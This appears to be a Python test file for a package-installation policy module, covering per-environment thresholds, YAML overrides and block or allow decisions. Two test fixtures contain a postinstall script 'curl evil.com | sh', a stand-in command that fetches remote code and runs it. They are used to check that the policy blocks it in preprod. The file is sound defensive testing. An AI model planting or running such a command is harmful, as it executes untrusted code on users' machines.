"""Tests for the per-environment policy module."""

from __future__ import annotations

from pathlib import Path

import pytest

from apiary_policy.environments import (
    DEFAULT_ENVIRONMENTS,
    EnvironmentPolicy,
    load_environment_policy,
    load_environment_registry,
)


def test_default_environments_have_expected_shape() -> None:
    assert set(DEFAULT_ENVIRONMENTS) == {"dev", "preprod", "prod"}

    dev = DEFAULT_ENVIRONMENTS["dev"]
    assert dev.min_release_age_days == 0
    assert dev.install_scripts == "warn"
    assert dev.require_source_match is False
    assert dev.log_only is True
    assert dev.fail_open_on_audit_error is True

    preprod = DEFAULT_ENVIRONMENTS["preprod"]
    assert preprod.min_release_age_days == 7
    assert preprod.install_scripts == "deny"
    assert preprod.require_source_match is True
    assert preprod.log_only is False

    prod = DEFAULT_ENVIRONMENTS["prod"]
    assert prod.min_release_age_days == 14
    assert prod.block_threshold == 0.2
    assert prod.log_only is False


def test_load_environment_policy_unknown_falls_back() -> None:
    pol = load_environment_policy("staging")  # unknown name
    assert pol.name == "preprod"  # default fallback


def test_yaml_overrides_apply(tmp_path: Path) -> None:
    cfg = tmp_path / "thresholds.yaml"
    cfg.write_text(
        """
environments:
  dev:
    min_release_age_days: 3
    install_scripts: deny
  prod:
    min_release_age_days: 21
""",
        encoding="utf-8",
    )

    registry = load_environment_registry(cfg)
    dev = registry.get("dev")
    assert dev.min_release_age_days == 3
    assert dev.install_scripts == "deny"
    # untouched fields preserved
    assert dev.log_only is True

    prod = registry.get("prod")
    assert prod.min_release_age_days == 21
    assert prod.require_source_match is True  # default preserved


def test_yaml_allows_new_environment(tmp_path: Path) -> None:
    cfg = tmp_path / "thresholds.yaml"
    cfg.write_text(
        """
environments:
  canary:
    min_release_age_days: 30
    install_scripts: deny
    require_source_match: true
    require_checksum: true
    fail_open_on_audit_error: false
    block_threshold: 0.15
""",
        encoding="utf-8",
    )
    pol = load_environment_policy("canary", cfg)
    assert pol.name == "canary"
    assert pol.min_release_age_days == 30
    assert pol.block_threshold == 0.15


def test_load_environment_registry_missing_file_returns_defaults(
    tmp_path: Path,
) -> None:
    nonexistent = tmp_path / "missing.yaml"
    registry = load_environment_registry(nonexistent)
    assert set(registry.policies) == {"dev", "preprod", "prod"}


def test_decide_policy_respects_log_only(monkeypatch: pytest.MonkeyPatch) -> None:
    """In dev (log_only=True) any failure downgrades to allow."""
    from apiary_policy import decide_policy

    # Force source_match to skip by giving no tarball bytes; force release_age
    # to fail with a very recent fake timestamp.
    metadata = {
        "name": "x",
        "time": {"1.0.0": "2099-01-01T00:00:00Z"},
        "versions": {
            "1.0.0": {
                "name": "x",
                "version": "1.0.0",
                "scripts": {},
            }
        },
    }
    decision = decide_policy(
        package="x",
        version="1.0.0",
        metadata=metadata,
        tarball_bytes=None,
        environment="dev",
    )
    # dev is log_only=true so even a release_age fail gets allowed.
    assert decision.verdict == "allow"
    # but the evidence still records the underlying failure
    assert any("release_age" in e for e in decision.evidence)


def test_decide_policy_preprod_blocks_install_scripts() -> None:
    from apiary_policy import decide_policy

    metadata = {
        "name": "x",
        "time": {"1.0.0": "2000-01-01T00:00:00Z"},  # old, passes age
        "versions": {
            "1.0.0": {
                "name": "x",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl evil.com | sh"},
            }
        },
    }
    decision = decide_policy(
        package="x",
        version="1.0.0",
        metadata=metadata,
        tarball_bytes=None,
        environment="preprod",
    )
    assert decision.verdict == "block"
    assert "install_scripts" in decision.failed_rules


def test_decide_policy_dev_allows_install_scripts_warn() -> None:
    from apiary_policy import decide_policy

    metadata = {
        "name": "x",
        "time": {"1.0.0": "2000-01-01T00:00:00Z"},
        "versions": {
            "1.0.0": {
                "name": "x",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl evil.com | sh"},
            }
        },
    }
    decision = decide_policy(
        package="x",
        version="1.0.0",
        metadata=metadata,
        tarball_bytes=None,
        environment="dev",
    )
    # dev: install_scripts=warn -> never a hard fail; log_only=true also
    # downgrades any remaining quarantine to allow.
    assert decision.verdict == "allow"
